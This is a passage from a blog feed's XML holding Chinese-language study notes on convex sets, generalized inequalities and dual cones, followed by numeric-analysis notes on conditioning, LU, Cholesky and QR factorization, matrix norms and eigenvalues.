$f:\mathbf{R}^{n+1}\rightarrow\mathbf{R}^n$（所有降低参数 1 个维度的函数）；</p><p>例如 $P(x,t)=\dfrac{x}{t}$，$dom\space P=\left\{(x,t)|t\gt0\right\}$；就是一个透视函数。</p><p>透视函数的像、逆像中有一个是凸集，那么另一个就是凸集。</p><hr><p>线性分式函数是 透视函数 和 仿射函数 的复合，定义为：$f(x)=\dfrac{Ax+b}{C^Tx+d}$，其中 $dom\space f=\left\{c^Tx+d\gt0\right\}$；</p><p>线性分式函数的像、逆像中有一个是凸集，那么另一个就是凸集。</p><h2 id="2-10-Generalized-Inequality"><a href="#2-10-Generalized-Inequality" class="headerlink" title="2.10 Generalized Inequality"></a>2.10 Generalized Inequality</h2><p>为了定义广义不等式（以便对凸优化进行处理、评价），人们引入了 proper cone（正常锥）的概念。</p><p>如果一个凸锥满足：</p><ul><li>K is closed (contains its boundary)</li><li>K is solid (has nonempty interior)</li><li>K is pointed (contains no line)</li></ul><p>那么这个凸锥就是正常锥。常见的正常锥有：</p><ul><li>非负实数集合 $R_+$；</li><li>非负象限 $R^n_+$；</li><li>半正定阵集合 $S^n_+$；</li></ul><p>简而言之，<u>正常锥是为了描述一种抽象的非负关系</u>（可以与离散数学中的偏序关系联系起来考虑），例如对向量而言的广义不等式可以在非负象限内考虑（感性理解：<u>两个向量之差在非负象限内才是广义大于关系</u>）：</p><script type="math/tex; mode=display">x\preceq_{\mathbf{R}^n_+}y\Longleftrightarrow x_i\le y_i</script><p>对于矩阵而言可以在半正定矩阵集合内考虑：</p><script type="math/tex; mode=display">X\preceq_{\mathbf{S}^n_+}Y\Longleftrightarrow Y-X\quad positive\space semidefinite</script><p>这样会发现（和偏序关系一样），广义不等式的许多性质（例如自反性、反对称性、传递性等）都和实数域上的不等关系一样。</p><p>但是，根据离散数学中的定义，广义不等关系不一定是线序关系（可以同时有 $x\npreceq_Ky$ 和 $y\npreceq_Kx$，即二者不可比）；</p><p>但我们仍然可以定义广义不等关系的 “最小元素”（为以后的凸优化做准备），但是因为 “不可比” 关系的存在，“最小” 的概念分裂成了最小元素（minimum，所有的元素都可与这个元素比较，并且是最小的）和 极小元素（minimal，可以与这个元素比较的所有元素都比它大）。它们的含义已经在离散数学的 “关系” 一章定义清楚了。</p><p><img src="cimgs/min-elements-def.png" height="400px"></p><p>如上图，在 $\mathbf{R}^n_+$ 中，凸集 $S_1$ 的最小元素是 $x_1$，因为它可以在 $R^n_+$ 上与其他任何元素比较（即凸集代表的图像全部包含在阴影部分区域内），并且它比所有元素都小；</p><p>凸集 $S_2$ 没有最小元素（因为发现 $\mathbf{R}^n_+$ 总是无法完全盖住这个凸集代表的图形，意味着有些元素间不可比），但它有无穷多个极小元素。其中一个极小元素 $x_2$，因为所有能比较的元素中，没有比它小的（即它的非正轴区域没有任何元素）。可以说 $x_2$ 所在的平边界上所有点都是 $S_2$ 关于 $\mathbf{R}^n_+$ 的极小元素。</p><h2 id="2-11-Seperating-amp-Supporting-Hyperplane-Theorem"><a href="#2-11-Seperating-amp-Supporting-Hyperplane-Theorem" class="headerlink" title="2.11 Seperating &amp; Supporting Hyperplane Theorem"></a>2.11 Seperating &amp; Supporting Hyperplane Theorem</h2><p>超平面分割定理。直觉上非常明显的定理。如果 $C$ 和 $D$ 是两个不相交凸集，那么必然存在向量 $a\ne0$ 和 $b$ 使得：$a^Tx\le b$ 对 $\forall x\in C$ 成立，$a^T x\ge b$ 对 $\forall x\in D$ 成立。感性理解如下图：</p><p><img src="cimgs/SHT.png" width="300px"></p><p>理解：一定存在一个超平面 $\left\{x|a^Tx=b\right\}$ 使得它能够完全划分两个不相交凸集。</p><blockquote><p>在机器学习中，将这个超平面称为 “线性分类器”。</p></blockquote><p>如果要 “严格划分”（去掉等号），还需要作出前提假设：例如 $C$ 是闭集等。</p><hr><p>超平面支持定理。直觉上也非常明显。对于一个凸集 $C$，一定能找到一个点 $x_0$ 以及一个超平面 $\left\{x|a^Tx=ax_0\right\}$ （$a\ne0$）使得 $a^Tx\le a^Tx_0$ 对 $\forall x\in C$ 成立。</p><p>感性理解如下：</p><p><img src="cimgs/SHT2.png" width="250px"></p><p>理解：对凸集边界上任意一点 $x_0$，一定存在一个超平面 $\left\{x|a^Tx=ax_0\right\}$ 使得它能够与凸集相切于该点，并且该点处外法线方向与 $a$ 同向（“移动” 超平面切到这个凸集的该点上）。</p><p>它可以由超平面分割定理证明出来。</p><h2 id="2-12-Dual-Cones"><a href="#2-12-Dual-Cones" class="headerlink" title="2.12 Dual Cones"></a>2.12 Dual Cones</h2><p>对偶锥的定义：对于一个凸锥 $K$，其对偶锥为 $K^*=\left\{y|y^Tx\ge0\space for\space all\space x\in K\right\}$；</p><p>形象理解：对偶锥的画法；</p><p><img src="cimgs/dual-cone-draw.png" height="200px"></p><p>（如果 $K$ 是尖的，那么 $K^*$ 就是钝的，二者是互补、对偶的）数学中有很多种类似的关系，例如共轭、转置等等。</p><p>其中 $\mathbf{R}_+^n$、 $\mathbf{S}^n_+$、二阶范式锥是自对偶的（self-dual）。一阶范式锥和无穷阶范式锥互为对偶锥。</p><p>注意，正常锥的对偶锥一定是正常锥。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Chapter-1-Overview&quot;&gt;&lt;a href=&quot;#Chapter-1-Overview&quot; class=&quot;headerlink&quot; title=&quot;Chapter 1. Overview&quot;&gt;&lt;/a&gt;Chapter 1. Overview&lt;/h1&gt;&lt;p&gt;进入本章</summary>
      
    
    
    
    <category term="review" scheme="https://blog.sjtuxhw.top/categories/review/"/>
    
    
    <category term="Math" scheme="https://blog.sjtuxhw.top/tags/Math/"/>
    
  </entry>
  
  <entry>
    <title>Numeric Analysis for Beginners</title>
    <link href="https://blog.sjtuxhw.top/review/numeric-analysis/"/>
    <id>https://blog.sjtuxhw.top/review/numeric-analysis/</id>
    <published>2024-06-12T05:11:56.000Z</published>
    <updated>2024-10-25T14:00:51.242Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Chapter-1-Basic-Concepts"><a href="#Chapter-1-Basic-Concepts" class="headerlink" title="Chapter 1. Basic Concepts"></a>Chapter 1. Basic Concepts</h1><ul><li><p>相对误差与绝对误差；</p></li><li><p>求根问题：$\text{For }f:\mathbf{R}\rightarrow\mathbf{R},\text{ find }x^*\text{ such that }f(x^*)=0$；</p><p>假设有估计解 $x_{est}$，但是 $0\lt |f(x_{est})|\ll1$，那么我们也许不知道 $|x_{est}-x_0|$，但是我们一定知道 $|f(x_{est})-f(x_0)|\equiv|f(x_{est})|$；</p><ul><li><p>前向误差：估计解与实际解的差值（就是上面的 $|x_{est}-x_0|$，一般我们不知道）；</p></li><li><p>后向误差：使得估计值正确所要让 problem statement 改变的 delta（就是上面的 $|f(x_{est})-f(x_0)|\equiv|f(x_{est})|$，一般我们能算出来）；</p></li><li><p>Well-Conditioned（insensitive）：$\text{Small backward error}\Rightarrow\text{Small forward error}$；</p></li><li><p>Poor-Conditioned（sensitive/stiff）：$\text{Small backward error}\nRightarrow\text{Small forward error}$；</p></li><li><p>Condition Number：$CN=\dfrac{\text{Forword Error}}{\text{Backward Error}}$；</p><blockquote><p>在寻根问题中，很容易得到 $CN=\dfrac{1}{|f^\prime(x^*)|}$；</p></blockquote></li></ul></li><li><p>Carefully Implementation</p><ul><li>防止溢出的方法：Element Scaling（例如求 $||\vec{x}||_2$）；</li></ul></li></ul><h1 id="Chapter-2-Linear-System-and-LU"><a href="#Chapter-2-Linear-System-and-LU" class="headerlink" title="Chapter 2. Linear System and LU"></a>Chapter 2. Linear System and LU</h1><h2 id="2-1-Review"><a href="#2-1-Review" class="headerlink" title="2.1 Review"></a>2.1 Review</h2><ul><li><p>Over Determined / Under Determined / Completely Determined.</p><blockquote><p>“高” 的矩阵可能是 over determined（更多限制条件）；</p><p>“宽” 的矩阵可能是 under determined（解更可能有无限个）；</p></blockquote></li><li><p>线性方程组的结论复习：一个线性方程组 $A\vec{x}=\vec{b}$ 有两个不同解 $\vec{x_0},\vec{x_1}$，则它有无穷多解；</p><blockquote><p> $\vec{x_0},\vec{x_1}$ 都是线性方程组的解，则它们的线性组合都是该线性方程组的解；</p></blockquote></li><li><p>经验结论：解线性方程组 $A\vec{x}=\vec{b}$ 能不解 $A^{-1}$ 就不解它（计算量和准确性）；</p></li><li><p>初等行变换：左乘初等矩阵；</p><blockquote><p>初等矩阵是指由单位矩阵经过一次基本行/列变换得到的矩阵。基本行/列变换包括以下三种操作：</p><ul><li><p><strong>交换型初等矩阵</strong>：形式为单位矩阵的两行（或列）交换得到的矩阵。例如，在3阶方阵中，交换第一行和第二行的单位矩阵为：</p><script type="math/tex; mode=display">\left[\begin{matrix}0&1&0\\1&0&0\\0&0&1\end{matrix}\right]</script></li><li><p><strong>倍加型初等矩阵</strong>：单位矩阵的某一行（或列）乘以非零常数后加到另一行（或列）得到的矩阵。例如，在3阶方阵中，将第一行的两倍加到第三行的单位矩阵为：</p><script type="math/tex; mode=display">\left[\begin{matrix}1&0&0\\0&1&0\\2&0&1\end{matrix}\right]</script></li></ul><ul><li><strong>倍乘型初等矩阵</strong>：单位矩阵的某一行（或列）乘以非零常数得到的矩阵。例如，在3阶方阵中，将第三行的元素都乘以2的单位矩阵为：<script type="math/tex; mode=display">\left[\begin{matrix}1&0&0\\0&1&0\\0&0&2\end{matrix}\right]</script></li></ul><p>将一个矩阵左乘对应的初等矩阵就是在对行进行对应的变换；</p><p>将一个矩阵右乘对应的初等矩阵就是在对列进行对应的变换；</p></blockquote></li><li><p>高斯消元：先 forward substitution（将第 i 行的前 i - 1 个元素清零、第 i 个元素置 1），再 back substitution（向之前代入）；</p></li></ul><h2 id="2-2-LU-Factorization"><a href="#2-2-LU-Factorization" class="headerlink" title="2.2 LU Factorization"></a>2.2 LU Factorization</h2><p>LU 分解：当参数矩阵不变，只有 $\vec{b}$ 不同时，我们可以节省重复计算的步骤。这种方法就是 $LU$ 分解。</p><ul><li>我们先将 $A$ 矩阵使用高斯消元为 $A=LU$（$U$ 是高斯消元的 forward substitution 的结果）；</li><li>这样可以分开计算 $L\vec{y}=b$ 中的 $\vec{y}$、$U\vec{x}=\vec{y}$ 解得 $\vec{x}$，每一步都是 $O(n^2)$；并且得到上/下三角矩阵的逆要比一般的 $A$ 简单；</li></ul><p><img src="imgs2/LU.png"></p><h2 id="2-3-Linear-System"><a href="#2-3-Linear-System" class="headerlink" title="2.3 Linear System"></a>2.3 Linear System</h2><ul><li><p>线性回归预测</p></li><li><p>线性系统拟合曲线：n 次试验构建一个线性方程组；</p><p><img src="imgs2/linear-fit.png" height="150px"></p><blockquote><p>线性系统拟合非线性曲线：可以让 $f$ 是非线性的，构建一个非线性函数 $f_{ij}$ 的矩阵；</p><p><img src="imgs2/ffit.png" height="200px"></p><p>一个特殊的例子是范特蒙德系统 $f=a_0+a_1x+a_2x^2+\cdots$；</p><p>我们还可以借助傅里叶展开 $f=a\cos(x+\phi)$；</p></blockquote></li><li><p>$A\vec{x}=\vec{b}$ 无解情况如何接近？凸优化：$\min\limits_{\vec{x}}||A\vec{x}-\vec{b}||_2^2$；</p><p><img src="imgs2/ms.png" height="300px"></p></li><li><p>Tikhonov regularization：这种正则化可以向 under determined 的情况加入限制，有助于防止过拟合、数据抖动、减轻数据噪声影响（对高斯白噪声效果好）等问题：</p><script type="math/tex; mode=display">\min\limits_{\vec{x}}||A\vec{x}-\vec{b}||_2^2+\alpha||\vec{x}||_2^2\quad(0\lt\alpha\le1)\\\Longrightarrow0=2A^TA\vec{x}-2A^T\vec{b}+2\alpha\vec{x}\\\Longrightarrow(A^TA+\alpha I_{n\times n})\vec{x}=A^T\vec{b}</script></li><li></li><li><p>稀疏矩阵存储：变换为低维数据（压缩信息的相关性）；</p><ul><li>普通有规律的矩阵，可以通过一些变换转换为稀疏矩阵；</li></ul></li></ul><h2 id="2-5-Cholesky-Factorization"><a href="#2-5-Cholesky-Factorization" class="headerlink" title="2.5 Cholesky Factorization"></a>2.5 Cholesky Factorization</h2><p>注意到重要的矩阵 $A^TA$ 有如下性质：</p><ul><li>正定对称阵（Positive definite Matrix）其中 $A\ne0$；</li></ul><p>而我们又发现正定对称矩阵的 LU 分解非常特殊，$U=L^T$，所以所有正定对称阵可以分解为 $A=LL^T$，这就是 Cholesky 分解；</p><ul><li><p>在阶数较小的情况，直接可以使用待定系数法求解 $L$；</p></li><li><p>在阶数较大的情况，使用迭代法求解 $L$，算法如下：</p><ol><li><p>初始化 $L=0$（全零矩阵，同时是下三角矩阵）；</p></li><li><p>对矩阵的每一列 $j$：</p><ul><li><p>先计算该列上的对角元 $L_{jj}=\sqrt{A_{jj}-\sum\limits_{k=1}^{j-1}L_{jk}^2}$（$j\gt1$），其中 $L_{11}=\sqrt{A_{11}}$；</p><blockquote><p>不难发现，$L$ 每行对角元只与 $A_{jj}$ 和当前行排在 $L_{jj}$ 之前的元素平方和有关；</p><p>可以将 $A$ 分块，即可推出这个结论；</p></blockquote></li><li><p>在第 $j$ 列中，继续对第 $j$ 行之后的每一行 $i\gt j$，计算 $L_{ij}=\dfrac{1}{L_{jj}}(A_{ij}-\sum\limits_{k=1}^{j-1}L_{ik}L_{jk})$，</p><blockquote><p>结论，$L_{ij}$ 与 $A_{ij}$ 和：排在 $L_{jj}$ 前面的元素向量 与 排在 $L_{ij}$ 前面的元素向量的点积有关；</p></blockquote></li></ul><p>完成上面两个步骤后，矩阵的第 $j$ 列全部计算完成；</p></li></ol></li></ul><h1 id="Chapter-3-Norms-Sensitivity-amp-Conditioning-in-Matrix"><a href="#Chapter-3-Norms-Sensitivity-amp-Conditioning-in-Matrix" class="headerlink" title="Chapter 3. Norms, Sensitivity &amp; Conditioning in Matrix"></a>Chapter 3. Norms, Sensitivity &amp; Conditioning in Matrix</h1><h2 id="3-1-Definitions-of-Norms-in-Matrix"><a href="#3-1-Definitions-of-Norms-in-Matrix" class="headerlink" title="3.1 Definitions of Norms in Matrix"></a>3.1 Definitions of Norms in Matrix</h2><p>引入：在浮点数计算时，如果在处理 $||A\vec{x_0}-\vec{b}||$ 时，它距离 0 有多接近才能相信 $x_0$ 是解？</p><p>也就是说，如何衡量 $(A+\delta A)\vec{x}=\vec{b}+\delta\vec{b}$ 求解下 $\vec{x}$ 解的变换幅度？</p><p>我们再次引入向量的范数：$||\vec{x}||_p=(\sum\limits_{i=1}^nx_i^p)^{1/p}$；</p><blockquote><ul><li>注意到 $p\rightarrow\infty$ 是 $||\vec{x}||=\max\{|x_1|,|x_2|,\ldots,|x_n|\}$；</li><li>$||\vec{x}||=0\quad\text{iff}\quad \vec{x}=0$；</li><li>$||c\vec{x}||=|c|||\vec{x}||,\space c\in\mathbf{R},\vec{x}\in\mathbf{R^n}$；</li><li>$||\vec{x}+\vec{y}||\le||\vec{x}||+||\vec{y}||,\space\forall\vec{x},\vec{y}\in\mathbf{R}$；</li></ul></blockquote><p>我们定义两个范数等价（$||\cdot||_p\equiv||\cdot||_q$） 当且仅当 对于任意 $\vec{x}\in\mathbf{R^n}$，都存在 $c_{low}||\vec{x}||\le||\vec{x}||\le c_{high}||\vec{x}||$（同阶）；</p><blockquote><p>推论：$\mathbf{R^n}$ 上的任意范式等价；</p></blockquote><p>我们再定义矩阵的范数：</p><ul><li><p>定义方法 1，“unrolled construction”（元素形式范数，entrywise norm）：将矩阵 $A_{m\times n}$ 按列展开（第 $n+1$ 列排在第 $n$ 列下方），得到一个 $\vec{a}\in\mathbf{R^{mn}}$ 的向量，而向量 $\vec{a}$ 的范数就是 $A$ 的范数；</p><script type="math/tex; mode=display">||A_{m\times n}||_p=(\sum\limits_{i=1}^m\sum\limits_{j=1}^n|a_{ij}|^p)^{1/p}</script><ul><li>二维元素形式范数又称 “Frobenius Norm”，记作 $||A||_{Fro}$；注意到 $||A||_F=\sqrt{\text{tr}(AA^T)}$；</li></ul></li><li><p>定义方法 2，“induced construction”（诱导范数，又称算子范数，operator norm）：描述了矩阵代表的线性变换 $A$ 对 $\vec{x}$ 作用最长伸展的比例。即：</p><script type="math/tex; mode=display">||A||=\max_{\vec{x}\ne0}\dfrac{||A\vec{x}||}{||\vec{x}||}=\max\limits_{||\vec{x}||=1}||A\vec{x}||</script><p>诱导范数的常用结论如下：</p><ul><li><p>$||A||_1=\max\limits_{1\le j\le n}\sum\limits_{i=1}^m|a_{ij}|$（1-诱导范数就是一列中的元素模之和，再取最大值）；</p></li><li><p>$||A||_\infty=\max\limits_{1\le i\le m}\sum\limits_{j=1}^n|a_{ij}|$（$\infty$-诱导范数就是一行中的元素模之和，再取最大值）；</p></li><li><p>$||A||_2=\sqrt{\max\limits_{k}\lambda_k}$（2-诱导范数，又称谱范数，是 $A$ 的最大奇异值的开根号。也就是说，当 $A$ 不可逆时就是 $A^TA$ 的最大特征值开根号）；</p><blockquote><p>可以从图形方法理解：</p><p><img src="imgs2/matrix-norm2.png" width="400px"></p></blockquote></li></ul></li><li><p>定义方法 3，“eigenvalue construction”（schatten 范数，使用矩阵奇异值定义），具体定义较为复杂，不进一步了解；</p></li></ul><h2 id="3-2-Definition-of-Condition-Number-in-Matrix"><a href="#3-2-Definition-of-Condition-Number-in-Matrix" class="headerlink" title="3.2 Definition of Condition Number in Matrix"></a>3.2 Definition of Condition Number in Matrix</h2><p>我们还要定义一个矩阵的条件数。一般条件数想要看的是一个矩阵构成的线性方程组随误差的变化情况。于是我们需要构建建模一个公式：$(A+\varepsilon\delta A)\vec{x}(\varepsilon)=\vec{b}+\varepsilon\delta\vec{b}$，于是可以得到在误差 $\varepsilon$ 下，</p><ul><li><p>$\vec{x}(\varepsilon)$ 表示在误差 $\varepsilon$ 下的 $\vec{x}$ 测量值；</p></li><li><p>$\dfrac{d\vec{x}}{d\varepsilon}|_{\varepsilon=0}=A^{-1}(\delta\vec{b}-\delta A\vec{x}(0))$ 表示 $\vec{x}$ 随误差的变化率；</p></li><li><p>$||\vec{x}(\varepsilon)-\vec{x}(0)||$ 表示前向误差，$\dfrac{||\vec{x}(\varepsilon)-\vec{x}(0)||}{||\vec{x}(0)||}\le|\varepsilon|||A^{-1}||||A||(\dfrac{||\delta\vec{b}||}{||\vec{b}||}+\dfrac{||\delta A||}{||A||})+O(\varepsilon^2)$ 表示归一化的前向误差；</p><blockquote><p>泰勒展开证明上式；</p></blockquote></li><li><p>于是我们定义方阵 $A\in\mathbf{R^{n\times n}}$ 的条件数为：$\text{cond}\space A\equiv\kappa\equiv||A||||A^{-1}||$；</p><p>如果 $A$ <u>不可逆</u>，则条件数为 $\infty$；</p><blockquote><p>得出结论：$\dfrac{||\vec{x}(\varepsilon)-\vec{x}(0)||}{||\vec{x}(0)||}\le\varepsilon\cdot D\cdot\kappa+O(\varepsilon^2)$；</p></blockquote><p>可以知道，一个矩阵的条件数描述的性质和行列式不一样，条件数与常系数缩放无关；</p></li><li><p><strong>重要推论 1</strong>：$\text{cond}\space A=\dfrac{\max\limits_{\vec{x}\ne0}\frac{||A\vec{x}||}{||\vec{x}||}}{\min\limits_{\vec{y}\ne0}\frac{||A\vec{y}||}{||\vec{y}||}}$（可以使用诱导范数直接推得）；</p></li></ul><p>几何上这么理解：在 $A$ 代表的线性变换下，对任意 $\vec{x}$ 作用<u>伸长最长的比例 与 伸长最短的比例 之比</u>；</p><p><img src="imgs2/matrix-cond.png" height="200px"></p><p>由这个几何关系，我们可以推出第二个推论：</p><ul><li><strong>重要推论 2</strong>：$||A^{-1}\vec{x}||\le||A^{-1}||||\vec{x}||$，因为 $||A^{-1}||$ 就是所有向量拉伸最长的比例了；</li></ul><blockquote><p>注：</p><ul><li>可以知道，一个矩阵的条件数越大，它所构成的线性方程组代表的线性系统对微小扰动越敏感的（解周围小范围变化自变量，总体值变化很大）；而一个矩阵的条件数越接近 1，则这个线性系统对微小扰动越不敏感；</li><li>由于很难求一个矩阵的逆，因此一般对条件数的讨论是讨论其上下界；</li></ul></blockquote><h1 id="Chapter-4-Column-Spaces-amp-QR"><a href="#Chapter-4-Column-Spaces-amp-QR" class="headerlink" title="Chapter 4. Column Spaces &amp; QR"></a>Chapter 4. Column Spaces &amp; QR</h1><p>考虑特殊矩阵的条件数 $\text{cond}\space A^TA\approx(\text{cond}\space A)^2$（在 $A$ 可逆的情况下）；</p><script type="math/tex; mode=display">\begin{aligned}\text{cond}\space A^TA&=||A^TA||\space||(A^TA)^{-1}||\\&\approx||A^T||\space||A||\space||A^{-1}||\space||(A^T)^{-1}||\\&=||A||^2||A^{-1}||^2\\&=(\text{cond}\space A)^2\end{aligned}</script><p>所以，我们对于一般的矩阵可以认为 $A^TA$ 越接近单位矩阵 $I_{n\times n}$，$A\vec{x}=\vec{b}$ 更容易解；</p><p>此外，$A^TA$ 的计算可以这么理解：</p><p><img src="imgs2/AtA.png" height="200px"></p><p>所以等价于我们希望 $A$ 是正交矩阵（各个列向量正交归一），而且<u>恰好正交矩阵代表的变换不改变向量的长度（所以正交矩阵的条件数是 1）</u>；</p><p>现在再回来看 $A^TA\vec{x}=A^T\vec{b}$，我们知道这个线性方程组的解就是 $\min\limits_{\vec{x}}||A\vec{x}-\vec{b}||$ 的解，就相当于将 $A$ 拆成列向量 $(\alpha_1,\alpha_2,\ldots,\alpha_n)$，将 $x_1\alpha_1+x_2\alpha_2+\cdots+x_n\alpha_n$ 逼近 $\vec{b}$（将 $\vec{b}$ 投影到 $A$ 列向量做基向量的线性空间上）；</p><blockquote><p>回忆线性代数的性质：</p><p>对任何实矩阵 $A\in\mathbf{R^{m\times n}}$ 和可逆方阵 $B\in\mathbf{R^{n\times n}}$，有 $\text{col}\space A=\text{col}\space AB$，即<u>对任意矩阵进行初等行变换不影响矩阵的列空间</u>；</p></blockquote><p>那么有没有办法对 $A$ 一直进行初等行变换，使得 $A$ 变成正交阵？这样 $A$ 的列空间不变（即原问题的解不变），但是 $A$ 成正交阵后非常好求解。</p><p>这种方法就是 QR 分解。我们将一般矩阵分解为一个正交阵（$A$ 的一组正交基）和上三角矩阵的乘积（上三角矩阵 $R$ 可以理解为一系列初等行变换）。</p><blockquote><p>显然，对于任意一个 $A$，若 $r(A_{m\times n})=n$（$m\ge n$），则 $A$ 都能进行 QR 分解。</p></blockquote><p>一旦我们将 $A^TA\vec{x}=A^T\vec{b}$ 进行 QR 分解：$A=QR$，那么 $\vec{x}=R^{-1}Q^T\vec{b}$，我们发现 $R$ 上三角矩阵容易求逆，就不需要计算 $A^TA$ 的逆了。</p><p>现在，QR 分解有 2 种方法。</p><ul><li><p>一种是通过 施密特正交化。这很好理解：</p><p><strong>现在回忆线性代数的 施密特正交化。这就是得到 $A=QR$ 的一种方法：</strong></p><ol><li>先对 $A$ 施密特正交化，再归一化就能得到基向量相同的正交矩阵 $Q$；</li><li>反解出 $R$：因为正交矩阵 $Q^TQ=I$，因此 $R=Q^TA$；</li></ol><blockquote><p>那么怎么 Gram-Schmidt 正交化？</p><p>对 $A$ 拆成的一组基 $(\alpha_1,\alpha_2,\ldots,\alpha_n)$，可以这么取正交基：</p><ul><li>$v_1=\alpha_1$，第一个向量随便取；</li><li>$v_2=\alpha_2-\dfrac{\alpha_2\cdot v_1}{v_1\cdot v_1}v_1$，第二个向量取 $\alpha_2$ 的时候，需要剔除第一个取得的基向量相关方向的分量：$\dfrac{\alpha_2\cdot v_1}{v_1\cdot v_1}$ 就是 $\alpha_2$ 在 $v_1$ 上的<u>投影长度</u>！</li><li>$v_3=\alpha_3-\dfrac{\alpha_3\cdot v_2}{v_2\cdot v_2}v_2-\dfrac{\alpha_3\cdot v_1}{v_1\cdot v_1}v_1$，第三个向量就减去 $\alpha_3$ 在 $v_1,v_2$ 上的投影分量就行。</li><li>……（依此类推）</li></ul><p>最后别忘了归一化。</p><p>不难发现，这种操作实际上在不断地对 $A$ 右乘上三角矩阵 $R_i$（进行初等列变换），使得：$AR_1R_2\cdots R_n=Q$；</p><p>相对地，下面的 Householder 变换方法，就是不断地进行正交变换（特别地，镜像变换），调整某一列的其他元素为 0，即不断地对 $A$ 左乘 Householder 矩阵（一种正交阵）$H_i$，使得：$H_nH_{n-1}\cdots H_1=R$；</p></blockquote></li><li><p>另一种是通过 Householder 变换（这是一个著名的变换，它代表了镜像变换，显然是一种正交变换），它所对应的矩阵就是 Householder 矩阵。</p><p>如图：</p><p><img src="imgs2/householder.png" width="300px"></p><p>假设已知一个向量 $\eta$，想要关于某个法线方向 $l$ 对称。为了方便，我们记与 $l$ 正交的一个从 $\eta$ 一边指向另一边的<u>单位向量</u>为 $\omega$，则由几何关系可知对称后的向量 $\xi$ 满足：$\xi-\eta=2\omega(\omega^T\xi)$，其中 $\omega^T\xi$ 就是 $\omega$ 和 $\xi$ 的点积（投影长度）；</p><p>因此 $\eta=(I-2\omega\omega^T)\xi$，我们发现，这镜面变换的矩阵就是 $H=I-2\omega\omega^T$，左乘它会将列向量变换到 $\omega$ 对应法线的 $\omega$ 指向的另一侧。</p><p>紧接着，我们发现这个矩阵 $H$ 有这个性质：</p><p>若 $H$ 为 Householder 矩阵，则 $\left[\begin{matrix}I_r&amp;0\\0&amp;H\end{matrix}\right]$ 也是 Householder 矩阵；</p><p>于是我们可以这么进行迭代：</p><ul><li><p>写 $A$ 的基向量 $(\alpha_1,\alpha_2,\ldots,\alpha_n)$，做第一次 householder 变换，使得 $\omega_1=\dfrac{\alpha_1-||\alpha_1||_2\cdot e_1}{||\alpha_1-||\alpha_1||_2\cdot e_1||_2}$，得到第一个 householder 矩阵 $H_1=I-2\omega_1\omega_1^T$，这样 $H_1A$ 的第一列除了第一个元素全部归 0：</p><blockquote><p>$\omega_1$ 可以理解为 $\alpha_1$ 减去在 $e_1$ 的分量（要镜像的方向已经得到了），再归一化，得到单位的镜像向量；</p><p><strong>$H_1\alpha_1$ 的变换就将 $\alpha_1$ 变换到与 $e_1$ 同一个方向上了。</strong></p></blockquote><p><img src="imgs2/householder-step1.png" width="500px"></p></li><li><p>记 $H_1A$ （注意是变换后的矩阵）关于 $a_{11}$ 的余子式为 $B_1$，则写 $B$ 的基向量 $(\beta_1,\beta_2,\ldots,\beta_{n-1})$，那么同理 $\omega_2=\dfrac{\beta_2-||\beta_2||_2\cdot e_1}{||\beta_2-||\beta_2||_2\cdot e_1||_2}$，得到第二个 householder 矩阵 $H_2=I-2\omega_2\omega_2^T$，这样 $H_2H_1A$ 的第一列和 $H_1A$ 一样、第二列除了前两个元素，后面的元素全部归 0:</p><p><img src="imgs2/householder-step2.png" width="400px"></p><blockquote><p>注意，$e_1$ 总是第一个元素为 1、其他元素为 0 的单位向量；</p></blockquote></li><li><p>重复上面的操作，最后 $H_{n-1}H_{n-2}\cdots H_1A=R$，$R$ 是一个上三角矩阵：</p></li><li><p>这样，我们得到了 $A$ 分解出的 $R$，最后反代 $Q=H_1H_2\cdots H_{n-1}$（注意正交阵的性质）；</p></li></ul></li></ul><h1 id="Chapter-5-Eigenvalue-amp-Eigenvector"><a href="#Chapter-5-Eigenvalue-amp-Eigenvector" class="headerlink" title="Chapter 5. Eigenvalue &amp; Eigenvector"></a>Chapter 5. Eigenvalue &amp; Eigenvector</h1><h2 id="5-1-Overview"><a href="#5-1-Overview" class="headerlink" title="5.1 Overview"></a>5.1 Overview</h2><p>在采集多维数据时，需要考虑各个维度间的相关性，以降低数据的维度。</p><p>举个例子，假设有组（该组有 $m$ 个数据） $n$ 维数据 $(v_1,v_2,\ldots,v_m),\space v_i\in\mathbf{R^n}$。</p><p>如果我们只知道某些维度上的确切数据，于是我们就像想将任意一个 $n$ 维数据用某几个维度去拟合整体数据。这样可以非常方便地讨论数据的整体特性。</p><p>这样，数据矩阵的特征值就能派上用场了。</p><p>除了这个问题，还有其他一些问题可以借助特征值进行解决，例如：</p><ul><li>Optimize $||A\vec{x}||_2$，固定 $||\vec{x}||_2=1$；</li><li>ODE/PDE（常微分方程、偏微分方程）的近似解：$\vec{y}^\prime=B\vec{y}$；</li><li>Rayleigh quotient（瑞利商）：$\dfrac{\vec{x}^TA\vec{x}}{||\vec{x}||_2^2}$；</li></ul><p>回忆下线性代数中对于特征向量/特征值的重要结论：</p><ul><li>每个 $n$ 阶方阵至少有一个特征向量（复向量），最多有 $n$ 个不同的特征值；</li><li>对应不同特征值的特征向量是线性无关的；</li></ul><h2 id="5-2-Review-Diagonalizable-Matrix"><a href="#5-2-Review-Diagonalizable-Matrix" class="headerlink" title="5.2 Review: Diagonalizable Matrix"></a>5.2 Review: Diagonalizable Matrix</h2><p>这里再复习一下矩阵对角化的知识：</p><p><strong>矩阵对角化的意义？</strong></p><ul><li><p>可快速计算 $A^k$；</p></li><li><p>可计算 Markov 过程中的平稳分布 $\pi$；</p></li><li>可计算差分方程 $u_{k+1}=Au_k$ 描述的离散动力系统的长期行为；</li><li>……</li></ul><p><strong>矩阵对角化的方法？</strong></p><ol><li><p>求出矩阵 $A$ 的所有特征值 $\lambda_i$；</p></li><li><p>通过 $A$ 的每个特征值，以及特征值的代数重数，来判断 $A$ 是否可对角化。具体来说：</p><p>代数重数就是在判断特征值重复的次数、几何重数就是在描述特征向量重复的维数（就是零空间的维数）。注意<u>每个特征值的几何重数一定小于等于代数重数</u>（因为对应不同特征值的特征向量是线性无关的，而特征值可以重复）。</p><p>这里 $A$ 要可对角化，就必须满足下面两种情况之一：</p><ul><li><strong>$A$ 的所有 $n$ 个特征值互不相等（代数重数 $n$）</strong>。而由于对于不同特征值的特征向量必然线性无关，所以几何重数一定也为 $n$；</li><li><strong>$A$ 所有重根下，$k$ 重特征值是否有 $k$ 个线性无关的特征向量</strong>。这里就是在要求这个代数重数为 $k$ 的特征值的几何重数是不是也是 $k$；</li></ul><p>所以上面的两个要求总体在说：$A$ 